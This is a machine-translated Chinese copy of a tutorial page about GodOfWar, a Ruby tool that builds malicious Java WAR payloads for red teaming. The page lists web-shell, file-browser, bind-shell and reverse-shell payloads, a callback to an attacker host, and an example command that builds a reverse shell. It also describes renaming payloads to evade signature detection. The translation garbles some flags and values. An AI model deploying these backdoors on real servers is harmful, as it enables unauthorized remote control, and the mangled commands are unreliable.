# GodOfWar:带有内置有效负载的恶意 Java WAR Builder

> 原文：<https://kalilinuxtutorials.com/godofwar-malicious-java-war-builder/>

GodOfWar 是一个命令行工具，用于为渗透测试/ red teaming 目的生成 War 有效载荷，用 ruby 编写。

**特性**

*   先前存在的有效载荷。(try-l/–list)
    *   cmd_get
    *   文件浏览器
    *   绑定 _ 外壳
    *   反向 _ 外壳
    *   反向外壳界面
*   可配置后门。(尝试–主机/-端口)
*   对有效负载名称的控制。
    *   为避免恶意命名，在部署后绕过 URL 名称签名。

**也读-[MySQL 魔法:从内存中转储 MySQL 客户端密码](https://kalilinuxtutorials.com/mysql-magic-dump-mysql/)**

**安装**

**$ gem 安装 godofwar**

**用途**

**$ godofwar -h**

**帮助菜单:**
-p，–PAYLOAD 有效载荷从一个可用的有效载荷中生成 war。(check-l/–list)
-H，–主机 IP_ADDR 所选有效负载的本地或远程 IP 地址(与-P/–有效负载一起使用)
-P，–端口所选有效负载的本地或远程端口(与-P/–有效负载一起使用)
-o，–Output[FILE]输出文件和部署名称。
(默认为有效载荷原始名称。check '-l/–list ')
-l，–list 列出所有可用的有效负载。
-h，–帮助显示此帮助信息。

**例子**

列出所有有效负载

```
$ godofwar -l
├── cmd_get
│   └── Information:
│       ├── Description: Command execution via web interface
│       ├── OS:          any
│       ├── Settings:    {"false"=>"No Settings required!"}
│       ├── Usage:       http://host/cmd.jsp?cmd=whoami
│       ├── References:  ["https://github.com/danielmiessler/SecLists/tree/master/Payloads/laudanum-0.8/jsp"]
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/cmd_get
├── filebrowser
│   └── Information:
│       ├── Description: Remote file browser, upload, download, unzip files and native command execution
│       ├── OS:          any
│       ├── Settings:    {"false"=>"No Settings required!"}
│       ├── Usage:       http://host/filebrowser.jsp
│       ├── References:  ["http://www.vonloesch.de/filebrowser.html"]
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/filebrowser
├── bind_shell
│   └── Information:
│       ├── Description: TCP bind shell
│       ├── OS:          any
│       ├── Settings:    {"port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse-shell.jsp
│       ├── References:  ["Metasploit - msfvenom -p java/jsp_shell_bind_tcp"]
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/bind_shell
├── reverse_shell_ui
│   └── Information:
│       ├── Description: TCP reverse shell with a HTML form to set LHOST and LPORT from browser.
│       ├── OS:          any
│       ├── Settings:    {"host"=>"attacker", "port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse_shell_ui.jsp
│       ├── References:  []
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell_ui
├── reverse_shell
│   └── Information:
│       ├── Description: TCP reverse shell. LHOST and LPORT are hardcoded
│       ├── OS:          any
│       ├── Settings:    {"host"=>"attacker", "port"=>4444, "false"=>"No Settings required!"}
│       ├── Usage:       http://host/reverse_shell.jsp
│       ├── References:  []
│       └── Local Path:  /var/lib/gems/2.5.0/gems/godofwar-1.0.1/payloads/reverse_shell
```

用 **LHOST** 和 **LPORT** 生成有效载荷

**godofwar-P reverse _ shell-H 192 . 168 . 100 . 10-P 9911-o 小狗**

[Download](https://github.com/KINGSABRI/godofwar)